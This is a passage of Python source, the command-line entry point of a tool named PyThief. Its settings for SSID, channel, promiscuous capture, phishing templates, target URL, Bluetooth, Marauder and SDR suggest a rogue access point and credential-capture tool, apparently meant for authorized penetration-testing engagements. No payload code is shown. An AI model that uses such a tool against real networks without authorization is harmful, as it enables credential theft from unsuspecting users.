    parser.add_argument("--setup-auth", action="store_true", help="Setup authorization file")

    # Utilities
    parser.add_argument("--health", action="store_true", help="Run health check")
    parser.add_argument("--json", action="store_true", help="JSON output")

    args = parser.parse_args(argv)

    # Setup logging
    handler = logging.StreamHandler()
    handler.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
    LOG.addHandler(handler)

    # Health check
    if args.health:
        result = health_check()
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            print(f"Tool: {result['tool']}")
            print(f"Status: {result['status']}")
            print(f"Summary: {result['summary']}")
            if result['details']:
                print(f"Details: {json.dumps(result['details'], indent=2)}")
        return 0 if result['status'] == 'ok' else 1

    # Setup authorization
    if args.setup_auth:
        auth_manager = AuthorizationManager()
        auth_manager.create_sample_auth_file()
        print(f"\n✓ Authorization file created at: {auth_manager.auth_file}")
        print("\nEdit this file to add your authorized engagements.")
        print("Each engagement needs:")
        print("  - id: Unique engagement identifier")
        print("  - token: Authorization token (secure hash)")
        print("  - scope: Description of authorized activities")
        return 0

    # Check dependencies
    if not DEPS_AVAILABLE:
        LOG.error("Missing Python dependencies. Install with:")
        LOG.error("  pip install beautifulsoup4 flask netifaces requests")
        return 1

    # Build config
    config = PyThiefConfig(
        interface=args.interface,
        ssid=args.ssid,
        channel=args.channel,
        internet_interface=args.internet,
        promiscuous_mode=args.promiscuous,
        capture_enabled=not args.no_capture,
        capture_dir=args.capture_dir,
        template_name=args.template,
        target_url=args.target_url,
        company_name=args.company,
        control_port=args.control_port,
        bluetooth_enabled=not args.no_bluetooth,
        marauder_enabled=args.marauder,
        marauder_device=args.marauder_device,
        sdr_enabled=args.sdr,
        sdr_device=args.sdr_device,
        authorization_token=args.auth_token,
        engagement_id=args.engagement_id
    )

    # Run PyThief
    pythief = PyThief(config)
    return pythief.run()


if __name__ == "__main__":
    sys.exit(main())
